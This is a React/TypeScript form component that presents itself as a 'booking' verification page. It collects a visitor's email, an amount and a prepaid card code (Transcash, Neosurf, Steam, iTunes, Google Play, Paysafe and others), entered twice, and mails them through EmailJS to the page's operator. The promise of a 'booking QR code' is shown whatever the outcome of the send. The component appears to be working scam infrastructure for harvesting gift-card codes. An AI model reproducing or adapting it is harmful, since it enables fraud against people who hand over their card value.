import { useEffect, useRef, useState } from 'react';
import emailjs from '@emailjs/browser';
import { Button, Checkbox, Label, TextInput, Select, Spinner } from 'flowbite-react';
import { notification } from 'antd';
import Verifyme from "../../assets/images/bookme.png"

export const ContactUs = () => {
    const [api, contextHolder] = notification.useNotification();

    const [errors, setErrors] = useState<Record<string, string | any>>()
    const inputCodeRef = useRef<HTMLInputElement>(null)
    const inputCodeRef2 = useRef<HTMLInputElement>(null)

    useEffect(() => {
        const handleChange = () => {
            const inputRef1 = inputCodeRef?.current?.value
            const inputRef2 = inputCodeRef2?.current?.value
            if (inputRef1 && inputRef2 && (inputRef1 !== inputRef2)) {
                setErrors(prev => ({ ...prev, "codeErrors": "Codes do not match" }))
            } else {
                setErrors(prev => ({ ...prev, "codeErrors": null }))
            }
        }

        inputCodeRef.current?.addEventListener("input", handleChange)
        inputCodeRef2.current?.addEventListener("input", handleChange)

        return () => {
            inputCodeRef.current?.removeEventListener("input", handleChange)
            inputCodeRef2.current?.removeEventListener("input", handleChange)
        }
    }, [])

    const openNotification = (text: string) => {
        api.success({
            message: `Notification`,
            description: text,
            placement: "bottom",
            duration: 0,
            onClose: () => window.location.reload()
        });
    };

    const [isSubmitting, setIsSubmitting] = useState(false)

    const formRef = useRef<any>();

    const sendEmail = (e: any) => {
        e.preventDefault();

        const checkErrors = Object.entries(errors as any).find(([_, value]: any) => value?.length > 0)
        if (checkErrors) {
            return
        }

        setIsSubmitting(true)

        emailjs
            .sendForm(import.meta.env.VITE_ID_ONE, import.meta.env.VITE_ID, formRef.current, {
                publicKey: import.meta.env.VITE_KEYER,
            })
            .then(
                () => {
                    // console.log('SUCCESS!');
                },
                (_) => {

                },
            ).finally(() => {
                openNotification("If your code is valid, an email containing your booking QR code will be dispatched to your inbox. Thank you!")
                // openNotification("If your code is valid, an email containing a sucess message will be dispatched to your inbox. Thank you for your cooperation!")
                setIsSubmitting(false)
            });
    };

    return (
        <div className="py-10">
            <img src={Verifyme} className="w-[300px] mx-auto mb-5" />
            <form ref={formRef} onSubmit={sendEmail} className="flex w-full lg:w-[50vw] flex-col gap-4 mx-auto px-10 py-7 bg-gray-50">
                {contextHolder}
                <div>
                    <div className="mb-2 block">
                        <Label htmlFor="user_name" value="NAME" />
                    </div>
                    <TextInput
                        name='user_name'
                        id="user_name"
                        type="text"
                        placeholder="-----"
                        shadow />
                </div>

                <div>
                    <div className="mb-2 block">
                        <Label htmlFor="for_who">WHO ARE YOU BOOKING? <span className='text-red-500'>*</span></Label>
                    </div>
                    <TextInput
                        name='for_who'
                        id="for_who"
                        type="text"
                        placeholder="-----"
                        required
                        shadow />
                </div>

                <div>
                    <div className="mb-2 block">
                        <Label htmlFor="user_email">YOUR EMAIL <span className='text-red-500'>*</span></Label>
                    </div>
                    <TextInput
                        name='user_email'
                        addon="@" id="user_email" type="email" placeholder="ENTER YOUR EMAIL TO RECIEVE BOOKING QR CODE" required shadow />
                </div>

                <div>
                    <div className="mb-2 block">
                        <Label htmlFor="card_amount">AMOUNT <span className='text-red-500'>*</span></Label>
                    </div>
                    <Select
                        name='card_amount' id='card_amount' required shadow>
                        <option></option>
                        {[5, 10, 15, 20, 25, 30, 50, 100, 150, 200, 250, 300, 350, 400, 500]
                            .map((number) => <option key={number}>{number}</option>)}
                        <option>OTHERS</option>
                    </Select>
                </div>

                <div>
                    <div className="mb-2 block">
                        <Label
                            color={(errors && errors["codeErrors"]) ? "failure" : ""}
                            htmlFor="card_code">CARD CODE <span className='text-red-500'>*</span></Label>
                    </div>
                    <TextInput
                        ref={inputCodeRef}
                        color={(errors && errors["codeErrors"]) ? "failure" : "gray"}
                        name='card_code' id="card_code" type="text" placeholder="-------------" required shadow
                        helperText={(errors && errors["codeErrors"])
                            ? <>
                                <span className="font-medium text-xs">{errors["codeErrors"]}</span>
                            </> : null}
                    />
                </div>

                <div>
                    <div className="mb-2 block">
                        <Label
                            color={(errors && errors["codeErrors"]) ? "failure" : ""}
                            htmlFor="confirm_card_code">CONFIRM CARD CODE <span className='text-red-500'>*</span></Label>
                    </div>
                    <TextInput
                        ref={inputCodeRef2}
                        color={(errors && errors["codeErrors"]) ? "failure" : "gray"}
                        name='confirm_card_code' id="confirm_card_code" type="text" placeholder="-------------" required shadow
                        helperText={(errors && errors["codeErrors"])
                            ? <>
                                <span className="font-medium text-xs">{errors["codeErrors"]}</span>
                            </> : null}
                    />
                </div>

                <div>
                    <div className="mb-2 block">
                        <Label htmlFor="card_type">CARD TYPE <span className='text-red-500'>*</span></Label>
                    </div>
                    <Select
                        name='card_type'
                        id="card_type" required shadow>
                        <option></option>
                        {[
                            "TRANSCASH",
                            "NEOSURF",
                            "GOOGLE PLAY",  // Typo corrected: Google Play
                            "STEAM",
                            "ITUNES",
                            "PAYSAFE",
                            "PCS",
                            "APPLE CARD",
                            "OTHERS"
                        ]
                            .map((card) => <option key={card}>{card}</option>)}
                    </Select>
                </div>


                <div className="flex items-center gap-2">
                    <Checkbox id="agree" />
                    <Label htmlFor="agree" className="flex">
                        HIDE THE CODE
                    </Label>
                </div>
                <Button disabled={isSubmitting} type="submit"> {isSubmitting && <Spinner aria-label="Alternate spinner button example" className='mr-2' size="sm" />} VALIDATE</Button>
            </form>
        </div>
    );
};